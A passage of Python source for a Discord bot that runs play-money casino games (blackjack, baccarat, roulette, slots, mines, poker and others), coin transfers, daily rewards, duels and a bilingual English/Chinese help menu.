        user_data[uid]["coins"] += amt * 2
        user_data[uid]["stats"]["money_won"] += amt * 2
        msg += _t(uid, "win", amt=amt*2)
    else: msg += _t(uid, "lose", amt=amt)
    save_data()
    await interaction.response.send_message(msg)

@tree.command(name="baccarat", description="Play Baccarat. Bet on Player, Banker, or Tie")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.choices(choice=[app_commands.Choice(name="Player (2x)", value="player"), app_commands.Choice(name="Banker (2x)", value="banker"), app_commands.Choice(name="Tie (9x)", value="tie")])
async def baccarat(interaction: discord.Interaction, bet: str, choice: app_commands.Choice[str]):
    amt = await validate_bet(interaction, bet)
    if not amt: return
    uid = str(interaction.user.id)
    cards = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 0, 0, 0] 
    p_hand = [random.choice(cards), random.choice(cards)]
    b_hand = [random.choice(cards), random.choice(cards)]
    p_score = sum(p_hand) % 10
    b_score = sum(b_hand) % 10
    if p_score < 8 and b_score < 8:
        if p_score <= 5: p_hand.append(random.choice(cards))
        if b_score <= 5: b_hand.append(random.choice(cards))
    p_score, b_score = sum(p_hand) % 10, sum(b_hand) % 10
    
    winner = "player" if p_score > b_score else "banker" if b_score > p_score else "tie"
    msg = f"🃏 **Baccarat**\n**Player:** {p_score} | **Banker:** {b_score}\n\n"
    
    if choice.value == winner:
        mult = 9 if winner == "tie" else 2
        user_data[uid]["coins"] += amt * mult
        user_data[uid]["stats"]["money_won"] += amt * mult
        msg += f"**{winner.capitalize()} wins!** " + _t(uid, "win", amt=amt*mult)
    elif winner == "tie" and choice.value in ["player", "banker"]:
        user_data[uid]["coins"] += amt
        msg += f"**Tie!** " + _t(uid, "tie", amt=amt)
    else:
        msg += f"**{winner.capitalize()} wins!** " + _t(uid, "lose", amt=amt)
    save_data()
    await interaction.response.send_message(msg)

@tree.command(name="rps", description="Rock Paper Scissors against the bot")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.choices(choice=[app_commands.Choice(name="Rock", value="rock"), app_commands.Choice(name="Paper", value="paper"), app_commands.Choice(name="Scissors", value="scissors")])
async def rps(interaction: discord.Interaction, bet: str, choice: app_commands.Choice[str]):
    amt = await validate_bet(interaction, bet)
    if not amt: return
    uid = str(interaction.user.id)
    bot_c = random.choice(["rock", "paper", "scissors"])
    msg = f"You chose {choice.value} | Bot chose {bot_c}\n\n"
    
    win_matrix = {"rock": "scissors", "paper": "rock", "scissors": "paper"}
    if choice.value == bot_c:
        user_data[uid]["coins"] += amt
        msg += _t(uid, "tie", amt=amt)
    elif win_matrix[choice.value] == bot_c:
        user_data[uid]["coins"] += amt * 2
        user_data[uid]["stats"]["money_won"] += amt * 2
        msg += _t(uid, "win", amt=amt*2)
    else:
        msg += _t(uid, "lose", amt=amt)
    save_data()
    await interaction.response.send_message(msg)
@tree.command(name="pay", description="Send coins to another user")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def pay(interaction: discord.Interaction, target: discord.User, amount: str):
    uid, tid = str(interaction.user.id), str(target.id)
    if target.bot or uid == tid: 
        return await interaction.response.send_message(_t(uid, "pay_invalid_target"), ephemeral=True)
    
    amt = parse_bet(uid, amount)
    if amt <= 0: 
        return await interaction.response.send_message(_t(uid, "invalid_bet"), ephemeral=True)

    # ORDER LOCKS TO PREVENT DEADLOCK
    u1, u2 = sorted([uid, tid])
    async with get_user_lock(u1), get_user_lock(u2):
        user = init_user(uid)
        t_user = init_user(tid)
        if user["coins"] < amt:
            return await interaction.response.send_message(_t(uid, "no_coins", coins=user["coins"]), ephemeral=True)
        user["coins"] -= amt
        t_user["coins"] += amt
        save_data()
    await interaction.response.send_message(_t(uid, "pay_success", target=target.mention, amt=amt))

@tree.command(name="daily", description="Claim your daily free coins")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def daily(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    async with get_user_lock(uid):  # ✔ 要縮排進來
        user = init_user(uid)
        now = time.time()
        last = user.get("last_daily", 0)

        if now - last < 86400:
            return await interaction.response.send_message(
                _t(
                    uid,
                    "daily_cooldown",
                    hours=int((86400 - (now - last)) // 3600),
                    minutes=int(((86400 - (now - last)) % 3600) // 60)
                ),
                ephemeral=True
            )

        user["coins"] += 500
        user["last_daily"] = now
        save_data()

        await interaction.response.send_message(
            _t(uid, "daily_success", amt=500)
        )

@tree.command(name="stats", description="Check your current balance and gambling statistics")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def stats(interaction: discord.Interaction):
    await interaction.response.defer()
    uid = str(interaction.user.id)
    user = init_user(uid)
    embed = discord.Embed(title=_t(uid, "stats_title", name=interaction.user.display_name), description=_t(uid, "stats_desc", coins=user["coins"], games=user["stats"]["games_played"], wagered=user["stats"]["money_wagered"], won=user["stats"]["money_won"]), color=discord.Color.gold())
    embed.set_thumbnail(url=interaction.user.display_avatar.url)
    await interaction.followup.send(embed=embed)
@tree.command(name="duel", description="Challenge a user to a 50/50 gambling duel")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def duel(interaction: discord.Interaction, target: discord.User, bet: str):
    if target.bot or target.id == interaction.user.id: return await interaction.response.send_message("❌ Invalid target.", ephemeral=True)
    amt = await validate_bet(interaction, bet)
    if not amt: return
    uid, tid = str(interaction.user.id), str(target.id)
    
    if init_user(tid)["coins"] < amt:
        init_user(uid)["coins"] += amt
        save_data()
        return await interaction.response.send_message(f"❌ {target.display_name} doesn't have enough coins.", ephemeral=True)

    class DuelView(discord.ui.View):
        def __init__(self): super().__init__(timeout=60)
        @discord.ui.button(label="Accept Duel", style=discord.ButtonStyle.danger, emoji="⚔️")
        async def acc(self, i, b):
            if str(i.user.id) != tid: return await i.response.send_message("Not for you!", ephemeral=True)
            if init_user(tid)["coins"] < amt: return await i.response.send_message("You don't have enough coins anymore!", ephemeral=True)
            init_user(tid)["coins"] -= amt
            winner = random.choice([uid, tid])
            init_user(winner)["coins"] += amt * 2
            init_user(winner)["stats"]["money_won"] += amt * 2
            save_data()
            for c in self.children: c.disabled = True
            await i.response.edit_message(content=f"⚔️ **DUEL RESOLVED**\n🏆 <@{winner}> won {amt*2} 🪙!", view=self)
            self.stop()
    await interaction.response.send_message(_t(uid, "duel_challenge", challenger=interaction.user.mention, target=target.mention, bet=amt), view=DuelView())

@tree.command(name="rps_duel", description="Challenge another user to a button RPS duel")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def rps_duel(interaction: discord.Interaction, target: discord.User):
    if target.bot or target.id == interaction.user.id: return await interaction.response.send_message("❌ 無效的目標！", ephemeral=True)
    class RPSDuelView(discord.ui.View):
        def __init__(self, p1, p2):
            super().__init__(timeout=60)
            self.p1, self.p2, self.p1_c, self.p2_c = p1, p2, None, None
        async def check(self, i):
            if self.p1_c and self.p2_c:
                for c in self.children: c.disabled = True
                em, win = {"rock": "🪨", "paper": "📄", "scissors": "✂️"}, {"rock": "scissors", "paper": "rock", "scissors": "paper"}
                res = "🤝 平局！ (Tie)" if self.p1_c == self.p2_c else f"🏆 {self.p1.mention} 贏了！" if win[self.p1_c] == self.p2_c else f"🏆 {self.p2.mention} 贏了！"
                await i.response.edit_message(content=f"⚔️ **RPS** ⚔️\n{self.p1.mention}: {em[self.p1_c]}\n{self.p2.mention}: {em[self.p2_c]}\n\n{res}", view=self)
                self.stop()
            else: await i.response.edit_message(content=f"⚔️ **RPS** ⚔️\n{self.p1.mention} vs {self.p2.mention}\nP1: {'✅' if self.p1_c else '❌'} | P2: {'✅' if self.p2_c else '❌'}", view=self)
        @discord.ui.button(label="Rock", emoji="🪨", style=discord.ButtonStyle.primary)
        async def r(self, i, b): await self.h(i, "rock")
        @discord.ui.button(label="Paper", emoji="📄", style=discord.ButtonStyle.success)
        async def p(self, i, b): await self.h(i, "paper")
        @discord.ui.button(label="Scissors", emoji="✂️", style=discord.ButtonStyle.danger)
        async def s(self, i, b): await self.h(i, "scissors")
        async def h(self, i, c):
            if i.user.id == self.p1.id: self.p1_c = c
            elif i.user.id == self.p2.id: self.p2_c = c
            else: return await i.response.send_message("❌ Not your duel!", ephemeral=True)
            await self.check(i)
    await interaction.response.send_message(f"⚔️ **RPS 決鬥** ⚔️\n{interaction.user.mention} vs {target.mention}", view=RPSDuelView(interaction.user, target))

@tree.command(name="aura", description="Get a random aura score")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def aura(interaction: discord.Interaction, target: discord.User = None):
    await interaction.response.send_message(f"✨ {(target or interaction.user).mention}'s Aura score is: **{random.randint(-10000, 100000)}**")


CATEGORIES = {
    "en": {

        "🎰 Casino": [
            "blackjack", "coinflip", "baccarat", "roulette", "slots",
            "dice", "crash", "mines", "poker", "highlow",
            "plinko", "keno", "scratch", "horserace", "lottery",
            "rps", "heist", "russian_roulette"
        ],

        "💰 Free Income": [
            "daily", "work", "crime", "earn", "fish",
            "mine", "trivia", "scramble"
        ],

        "📊 Economy": [
            "pay", "stats", "leaderboard", "shop", "inventory",
            "rob", "giveaway", "upgrade", "crypto", "pet",
            "marry", "profile"
        ],

        "🎮 Games": [
            "duel", "rps_duel", "tictactoe", "connect4",
            "fight", "wordchain", "mafia", "minecraft"
        ],

        "🧰 Utility": [
            "echo", "ping", "roll", "choose",
            "avatar", "aura", "ship", "language",
            "help", 
        ]
    },

    "zh": {

        "🎰 賭場": [
            "blackjack", "coinflip", "baccarat", "roulette", "slots",
            "dice", "crash", "mines", "poker", "highlow",
            "plinko", "keno", "scratch", "horserace", "lottery",
            "rps", "heist", "russian_roulette"
        ],

        "💰 自由收入": [
            "daily", "work", "crime", "earn", "fish",
            "mine", "trivia", "scramble"
        ],

        "📊 經濟系統": [
            "pay", "stats", "leaderboard", "shop", "inventory",
            "rob", "giveaway", "upgrade", "crypto", "pet",
            "marry", "profile"
        ],

        "🎮 遊戲": [
            "duel", "rps_duel", "tictactoe", "connect4",
            "fight", "wordchain", "mafia", "minecraft"
        ],

        "🧰 工具": [
            "echo", "ping", "roll", "choose",
            "avatar", "aura", "ship", "language",
            "help",
        ]
    }
}
def get_category_commands(commands_desc, category_list):
    result = []

    for cmd, desc in commands_desc.items():
        name = cmd.split()[0].replace("/", "")
        if name in category_list:
            result.append((cmd, desc))

    return result

class HelpDropdown(discord.ui.Select):
    def __init__(self, uid, lang):
        self.uid = uid
        self.lang = lang

        options = [
            discord.SelectOption(label=cat, value=cat)
            for cat in CATEGORIES[lang].keys()
        ]

        super().__init__(
            placeholder="Select a category...",
            options=options
        )

    async def callback(self, interaction: discord.Interaction):

        if str(interaction.user.id) != self.uid:
            return await interaction.response.send_message(
                "❌ Not your menu!",
                ephemeral=True
            )

        category = self.values[0]

        commands_desc = get_help_dict(self.uid)

        cmd_list = get_category_commands(
            commands_desc,
            CATEGORIES[self.lang][category]
        )

        embed = discord.Embed(
            title=category,
            color=discord.Color.blue()
        )

        for cmd, desc in cmd_list:
            embed.add_field(name=cmd, value=desc, inline=False)

        await interaction.response.edit_message(embed=embed, view=self.view)

class HelpDropdownView(discord.ui.View):
    def __init__(self, uid, lang):
        super().__init__(timeout=180)
        self.uid = uid
        self.add_item(HelpDropdown(uid, lang))
        
@tree.command(name="help", description="View help menu")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def help_cmd(interaction: discord.Interaction):

    uid = str(interaction.user.id)
    init_user(uid)

    lang = user_data[uid].get("lang", "en")

    embed = discord.Embed(
        title="📖 Help Menu" if lang == "en" else "📖 指令選單",
        description="Select a category below 👇" if lang == "en"
        else "請選擇分類 👇",
        color=discord.Color.blue()
    )

    await interaction.response.send_message(
        embed=embed,
        view=HelpDropdownView(uid, lang)
    )

# ==========================================
# CASINO COMMANDS
# ==========================================

async def validate_bet(interaction, bet_str, is_deferred=False):
    uid = str(interaction.user.id)
    user = init_user(uid)
    bet = parse_bet(uid, bet_str)
    send_func = interaction.followup.send if is_deferred else interaction.response.send_message
    if bet <= 0:
        await send_func(_t(uid, "invalid_bet"), ephemeral=True)
        return None
    
    # LOCK CHECK & DEDUCTION
    async with get_user_lock(uid):
        user = init_user(uid) # Re-fetch inside lock to ensure latest state
        if user["coins"] < bet:
            await send_func(_t(uid, "no_coins", coins=user["coins"]), ephemeral=True)
            return None
        user["coins"] -= bet
        user["stats"]["money_wagered"] += bet
        user["stats"]["games_played"] += 1
        save_data()
    return bet

def bj_value(hand):
    val = sum(c if isinstance(c, int) else 10 if c in ['J','Q','K'] else 11 for c in hand)
    aces = sum(1 for c in hand if c == 'A')
    while val > 21 and aces:
        val -= 10
        aces -= 1
    return val

class BlackjackView(discord.ui.View):
    def __init__(self, uid, bet, p_hand, d_hand, deck):
        super().__init__(timeout=60)
        self.uid = uid
        self.bet = bet
        self.p_hand = p_hand
        self.d_hand = d_hand
        self.deck = deck
        
    def generate_embed(self, game_over=False):
        d_val = bj_value(self.d_hand) if game_over else bj_value([self.d_hand[0]])
        p_val = bj_value(self.p_hand)
        
        d_disp = f"{self.d_hand} (Val: {d_val})" if game_over else f"[{self.d_hand[0]}, ❓] (Val: {d_val})"
        p_disp = f"{self.p_hand} (Val: {p_val})"
        
        embed = discord.Embed(title="🃏 Blackjack", color=discord.Color.green())
        embed.add_field(name="Dealer's Hand", value=d_disp, inline=False)
        embed.add_field(name="Your Hand", value=p_disp, inline=False)
        return embed, p_val, d_val

    async def end_game(self, interaction, reason, p_val, d_val):
        for child in self.children: child.disabled = True
        user = init_user(self.uid)
        if reason == "win":
            winnings = self.bet * 2
            user["coins"] += winnings
            user["stats"]["money_won"] += winnings
            msg = _t(self.uid, "win", amt=winnings)
        elif reason == "tie":
            user["coins"] += self.bet
            msg = _t(self.uid, "tie", amt=self.bet)
        else:
            msg = _t(self.uid, "lose", amt=self.bet)
            
        save_data()
        embed, _, _ = self.generate_embed(game_over=True)
        embed.description = msg
        await interaction.response.edit_message(embed=embed, view=self)
        self.stop()

    @discord.ui.button(label="Hit", style=discord.ButtonStyle.primary)
    async def hit(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid: return
        self.p_hand.append(self.deck.pop())
        embed, p_val, d_val = self.generate_embed()
        if p_val > 21: await self.end_game(interaction, "lose", p_val, d_val)
        else: await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Stand", style=discord.ButtonStyle.danger)
    async def stand(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid: return
        p_val = bj_value(self.p_hand)
        d_val = bj_value(self.d_hand)
        while d_val < 17:
            self.d_hand.append(self.deck.pop())
            d_val = bj_value(self.d_hand)
        if d_val > 21 or p_val > d_val: await self.end_game(interaction, "win", p_val, d_val)
        elif p_val == d_val: await self.end_game(interaction, "tie", p_val, d_val)
        else: await self.end_game(interaction, "lose", p_val, d_val)

@tree.command(name="blackjack", description="Play classic 21 against the dealer")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def blackjack(interaction: discord.Interaction, bet: str):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    
    uid = str(interaction.user.id)
    deck = [2,3,4,5,6,7,8,9,10,'J','Q','K','A'] * 4
    random.shuffle(deck)
    p_hand = [deck.pop(), deck.pop()]
    d_hand = [deck.pop(), deck.pop()]
    view = BlackjackView(uid, amt, p_hand, d_hand, deck)
    embed, p_val, d_val = view.generate_embed()
    if p_val == 21: await view.end_game(interaction, "win", p_val, d_val)
    else: await interaction.followup.send(embed=embed, view=view)

class MinesView(discord.ui.View):
    def __init__(self, uid: str, bet: int, bombs: int, bias: float):
        super().__init__(timeout=90)
        self.uid, self.bet, self.bombs = uid, bet, max(1, min(15, bombs + int(bias * -2))) # 动态调雷
        self.safe_clicks, self.max_safe = 0, 25 - self.bombs
        self.grid = ["💣"] * self.bombs + ["💎"] * self.max_safe
        random.shuffle(self.grid)
        for i in range(25):
            btn = discord.ui.Button(label="?", style=discord.ButtonStyle.secondary, row=i//5)
            btn.callback = self.create_callback(i, btn)
            self.add_item(btn)
        self.cashout_btn = discord.ui.Button(label="CASH OUT (0.00x)", style=discord.ButtonStyle.success, row=5, disabled=True)
        self.cashout_btn.callback = self.cashout
        self.add_item(self.cashout_btn)

    def get_mult(self): return round(1.0 + (self.safe_clicks * 0.18 * (self.bombs / 4)), 2)

    def create_callback(self, idx, btn):
        async def callback(i: discord.Interaction):
            if str(i.user.id) != self.uid or btn.disabled: return
            if self.grid[idx] == "💣":
                btn.emoji, btn.style = "💣", discord.ButtonStyle.danger
                for c in self.children: c.disabled = True
                await i.response.edit_message(content=f"💥 **BOOM!** Lost {self.bet} 🪙.\n💡 Tip: 下次在 {self.safe_clicks} 格时考虑兑现，期望更稳。", view=self)
                record_game(self.uid, False); save_data()
                self.stop()
            else:
                self.safe_clicks += 1
                btn.emoji, btn.style = "💎", discord.ButtonStyle.primary
                self.cashout_btn.disabled, self.cashout_btn.label = False, f"CASH OUT ({self.get_mult()}x)"
                if self.safe_clicks >= self.max_safe:
                    await self.cashout(i)
                else: await i.response.edit_message(view=self)
        return callback

    async def cashout(self, i: discord.Interaction):
        if str(i.user.id) != self.uid: return
        for c in self.children: c.disabled = True
        win = int(self.bet * self.get_mult())
        user_data[self.uid]["coins"] += win
        user_data[self.uid]["stats"]["money_won"] += win
        record_game(self.uid, True); save_data()
        await i.response.edit_message(content=f"✅ Cashed out at **{self.get_mult()}x**!\nWon **{win} 🪙**", view=self)
        self.stop()

@tree.command(name="mines", description="Click safe tiles. Multiplier rises until you hit a bomb!")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def mines(interaction: discord.Interaction, bet: str, bombs: app_commands.Range[int, 1, 15]):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    uid = str(interaction.user.id)
    bias = get_flow(uid)["difficulty_bias"] # -0.08 ~ 0.08
    view = MinesView(uid, amt, bombs, bias)
    await interaction.followup.send(f"💣 MINES ({view.bombs} bombs)\nBet: {amt} 🪙\n点击安全格提升倍率！", view=view)
class PokerView(discord.ui.View):
    def __init__(self, uid, bet):
        super().__init__(timeout=60)
        self.uid = uid
        self.bet = bet
        self.deck = ['2','3','4','5','6','7','8','9','10','J','Q','K','A'] * 4
        random.shuffle(self.deck)
        self.hand = [self.deck.pop() for _ in range(5)]
        self.held = [False] * 5
        for i in range(5):
            btn = discord.ui.Button(label=self.hand[i], style=discord.ButtonStyle.secondary, row=0)
            btn.callback = self.create_hold_callback(i, btn)
            self.add_item(btn)
        self.draw_btn = discord.ui.Button(label="DRAW CARDS", style=discord.ButtonStyle.success, row=1)
        self.draw_btn.callback = self.draw_cards
        self.add_item(self.draw_btn)

    def create_hold_callback(self, index, button):
        async def callback(interaction: discord.Interaction):
            if str(interaction.user.id) != self.uid: return
            self.held[index] = not self.held[index]
            button.style = discord.ButtonStyle.primary if self.held[index] else discord.ButtonStyle.secondary
            await interaction.response.edit_message(view=self)
        return callback

    async def draw_cards(self, interaction: discord.Interaction):
        if str(interaction.user.id) != self.uid: return
        for i in range(5):
            if not self.held[i]: self.hand[i] = self.deck.pop()
        for child in self.children: child.disabled = True
        
        counts = {c: self.hand.count(c) for c in set(self.hand)}
        pairs = sum(1 for v in counts.values() if v == 2)
        three = 3 in counts.values()
        four = 4 in counts.values()
        
        mult, hand_name = 0, "High Card"
        if four: mult, hand_name = 10, "Four of a Kind!"
        elif three and pairs == 1: mult, hand_name = 8, "Full House!"
        elif three: mult, hand_name = 3, "Three of a Kind!"
        elif pairs == 2: mult, hand_name = 2, "Two Pair!"
        elif pairs == 1: mult, hand_name = 1, "One Pair!"
            
        winnings = self.bet * mult
        msg = f"🃏 **Final Hand:** {' | '.join(self.hand)}\n**Result:** {hand_name}\n"
        user = init_user(self.uid)
        if winnings > 0:
            user["coins"] += winnings
            user["stats"]["money_won"] += winnings
            msg += _t(self.uid, "win", amt=winnings)
        else: msg += _t(self.uid, "lose", amt=self.bet)
        save_data()
        await interaction.response.edit_message(content=msg, view=self)
        self.stop()

@tree.command(name="poker", description="5-card draw video poker")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def poker(interaction: discord.Interaction, bet: str):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    view = PokerView(str(interaction.user.id), amt)
    await interaction.followup.send(f"🃏 **Video Poker** - Click cards to HOLD, then press DRAW.", view=view)

class HighLowView(discord.ui.View):
    def __init__(self, uid, bet):
        super().__init__(timeout=60)
        self.uid = uid
        self.bet = bet
        self.streak = 0
        self.current_card = random.randint(2, 14)
        
    def get_card_name(self, val): return {11: 'J', 12: 'Q', 13: 'K', 14: 'A'}.get(val, str(val))

    async def process_guess(self, interaction: discord.Interaction, guess: str):
        if str(interaction.user.id) != self.uid: return
        next_card = random.randint(2, 14)
        won = (guess == "high" and next_card >= self.current_card) or (guess == "low" and next_card <= self.current_card)
        if won:
            self.streak += 1
            self.current_card = next_card
            mult = round(1.0 + (self.streak * 0.5), 2)
            await interaction.response.edit_message(content=f"📈 **High/Low**\nCard is **{self.get_card_name(self.current_card)}**.\nYou have a {mult}x multiplier. Keep going or cash out?", view=self)
        else:
            for child in self.children: child.disabled = True
            await interaction.response.edit_message(content=f"💥 Next card was **{self.get_card_name(next_card)}**! You lost your {self.bet} 🪙 bet.", view=self)
            self.stop()

    @discord.ui.button(label="Higher", style=discord.ButtonStyle.primary, emoji="⬆️")
    async def higher(self, i: discord.Interaction, b: discord.ui.Button): await self.process_guess(i, "high")
    @discord.ui.button(label="Lower", style=discord.ButtonStyle.danger, emoji="⬇️")
    async def lower(self, i: discord.Interaction, b: discord.ui.Button): await self.process_guess(i, "low")
    @discord.ui.button(label="Cash Out", style=discord.ButtonStyle.success)
    async def cashout(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid: return
        for child in self.children: child.disabled = True
        mult = round(1.0 + (self.streak * 0.5), 2)
        winnings = int(self.bet * mult)
        user = init_user(self.uid)
        user["coins"] += winnings
        user["stats"]["money_won"] += winnings
        save_data()
        await interaction.response.edit_message(content=f"✅ Cashed out at **{mult}x**!\nWon **{winnings}** 🪙", view=self)
        self.stop()

@tree.command(name="highlow", description="Guess if the next card is higher or lower")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def highlow(interaction: discord.Interaction, bet: str):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    view = HighLowView(str(interaction.user.id), amt)
    await interaction.followup.send(f"📈 **High/Low**\nStarting Card is **{view.get_card_name(view.current_card)}**.\nHigher or Lower?", view=view)

class HeistView(discord.ui.View):
    def __init__(self, host_id, bet):
        super().__init__(timeout=30)
        self.host_id = host_id
        self.bet = bet
        self.participants = [host_id]

    @discord.ui.button(label="Join Heist", style=discord.ButtonStyle.primary, emoji="🏃")
    async def join(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = str(interaction.user.id)
        if uid in self.participants: return await interaction.response.send_message("❌ You are already in the heist!", ephemeral=True)
        user = init_user(uid)
        if user["coins"] < self.bet: return await interaction.response.send_message("❌ You don't have enough coins!", ephemeral=True)
        user["coins"] -= self.bet
        user["stats"]["money_wagered"] += self.bet
        save_data()
        self.participants.append(uid)
        await interaction.response.send_message(f"✅ {interaction.user.display_name} joined the heist!", ephemeral=False)

@tree.command(name="heist", description="Start a group heist for big payouts!")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def heist(interaction: discord.Interaction, bet: str):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    view = HeistView(str(interaction.user.id), amt)
    embed = discord.Embed(title="🏦 Bank Heist Starting!", description=f"Cost to join: **{amt}** 🪙\nClick the button to join the crew! Leaves in 30 seconds.", color=discord.Color.dark_grey())
    await interaction.followup.send(embed=embed, view=view)
    await asyncio.sleep(30)
    for child in view.children: child.disabled = True
    await interaction.edit_original_response(view=view)
    survivors, dead = [], []
    for p in view.participants:
        if random.choice([True, False]):
            survivors.append(p)
            user = init_user(p)
            winnings = amt * 3
            user["coins"] += winnings
            user["stats"]["money_won"] += winnings
        else: dead.append(p)
    save_data()
    res_embed = discord.Embed(title="🏦 Heist Results", color=discord.Color.red())
    res_embed.add_field(name="Survivors (Won 3x)", value=f"<@{'>, <@'.join(survivors)}>" if survivors else "Nobody...", inline=False)
    res_embed.add_field(name="Busted (Lost everything)", value=f"<@{'>, <@'.join(dead)}>" if dead else "Nobody!", inline=False)
    await interaction.followup.send(embed=res_embed)

@tree.command(name="lottery", description="Buy a lottery ticket for 100 🪙 or view the pot!")
@app_commands.choices(action=[
    app_commands.Choice(name="Buy Ticket", value="buy"),
    app_commands.Choice(name="View Pot", value="view"),
    app_commands.Choice(name="Draw Winner (Admins Only)", value="draw")
])
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def lottery(interaction: discord.Interaction, action: app_commands.Choice[str]):
    uid = str(interaction.user.id)
    if action.value == "view":
        return await interaction.response.send_message(f"🎟️ **Lottery Pot:** {lottery_pool['pot']} 🪙\nTotal Tickets: {len(lottery_pool['tickets'])}")

    async with lottery_lock:
        if action.value == "buy":
            cost = 100
            async with get_user_lock(uid):
                user = init_user(uid)
                if user["coins"] < cost:
                    msg = _t(uid, "no_coins", coins=user["coins"])
                else:
                    user["coins"] -= cost
                    lottery_pool["tickets"].append(uid)
                    lottery_pool["pot"] += cost
                    save_data()
                    msg = f"✅ Bought ticket for 100 🪙! Pot: **{lottery_pool['pot']}** 🪙"
            await interaction.response.send_message(msg, ephemeral=True if "❌" in msg else False)

        elif action.value == "draw":
            if interaction.user.id not in WHITELIST_IDS:
                return await interaction.response.send_message("❌ Admins only.", ephemeral=True)
            if not lottery_pool["tickets"]:
                return await interaction.response.send_message("❌ Nobody bought any tickets yet!")
            
            winner_id = random.choice(lottery_pool["tickets"])
            winnings = lottery_pool["pot"]
            async with get_user_lock(winner_id):
                w_user = init_user(winner_id)
                w_user["coins"] += winnings
                w_user["stats"]["money_won"] += winnings
                lottery_pool["tickets"], lottery_pool["pot"] = [], 0
                save_data()
            await interaction.response.send_message(f"🎉 **LOTTERY DRAWN!** 🎉\n<@{winner_id}> won the grand prize of **{winnings} 🪙**!")

@tree.command(name="roulette", description="Play classic roulette")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.choices(choice=[
    app_commands.Choice(name="Red (2x)", value="red"),
    app_commands.Choice(name="Black (2x)", value="black"),
    app_commands.Choice(name="Even (2x)", value="even"),
    app_commands.Choice(name="Odd (2x)", value="odd"),
    app_commands.Choice(name="Specific Number (Type number below)", value="number")
])
async def roulette(interaction: discord.Interaction, bet: str, choice: app_commands.Choice[str], number: int = None):
    amt = await validate_bet(interaction, bet)
    if not amt: return
    uid = str(interaction.user.id)
    if choice.value == "number" and (number is None or not (0 <= number <= 36)):
        user_data[uid]["coins"] += amt
        save_data()
        return await interaction.response.send_message("❌ Please provide a valid number between 0 and 36 if choosing 'Number'.", ephemeral=True)
    result_num = random.randint(0, 36)
    is_red = result_num in [1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36]
    color_emoji = "🟩" if result_num == 0 else ("🟥" if is_red else "⬛")
    
    win_amt = 0
    if choice.value == "number" and number == result_num: win_amt = amt * 36
    elif choice.value == "red" and is_red and result_num != 0: win_amt = amt * 2
    elif choice.value == "black" and not is_red and result_num != 0: win_amt = amt * 2
    elif choice.value == "even" and result_num % 2 == 0 and result_num != 0: win_amt = amt * 2
    elif choice.value == "odd" and result_num % 2 != 0: win_amt = amt * 2

    msg = f"🎰 The wheel spins... It lands on **{result_num} {color_emoji}**!\n\n"
    if win_amt > 0:
        user_data[uid]["coins"] += win_amt
        user_data[uid]["stats"]["money_won"] += win_amt
        msg += _t(uid, "win", amt=win_amt)
    else: msg += _t(uid, "lose", amt=amt)
    save_data()
    await interaction.response.send_message(msg)

@tree.command(name="slots", description="Spin the slot machine")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def slots(interaction: discord.Interaction, bet: str):
    amt = await validate_bet(interaction, bet)
    if not amt: return
    uid = str(interaction.user.id)
    res = random.choices(["🍒", "🍋", "🍇", "🍉", "🔔", "⭐", "💎"], weights=[30, 25, 20, 15, 10, 5, 2], k=3)
    winnings = 0
    if res[0] == res[1] == res[2]: winnings = amt * (10 if res[0] != "💎" else 50)
    elif res[0] == res[1] or res[1] == res[2] or res[0] == res[2]: winnings = amt * 2
        
    msg = f"🎰 **SLOTS** 🎰\n\n[{res[0]} | {res[1]} | {res[2]}]\n\n"
    if winnings > 0:
        user_data[uid]["coins"] += winnings
        user_data[uid]["stats"]["money_won"] += winnings
        msg += _t(uid, "win", amt=winnings)
    else: msg += _t(uid, "lose", amt=amt)
    save_data()
    await interaction.response.send_message(msg)

@tree.command(name="dice", description="Roll a 100-sided die against the house")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def dice(interaction: discord.Interaction, bet: str):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    uid = str(interaction.user.id)
    roll = random.randint(1, 100)
    msg = f"🎲 You rolled a **{roll}**!\n"
    if roll > 50:
        winnings = amt * 2
        user_data[uid]["coins"] += winnings
        user_data[uid]["stats"]["money_won"] += winnings
        msg += _t(uid, "win", amt=winnings)
    else: msg += _t(uid, "lose", amt=amt)
    save_data()
    await interaction.followup.send(msg)

class CrashView(discord.ui.View):
    def __init__(self, uid: str, bet: int, base_crash: float, pity_guarantee: float):
        super().__init__(timeout=30)
        self.uid, self.bet = uid, bet
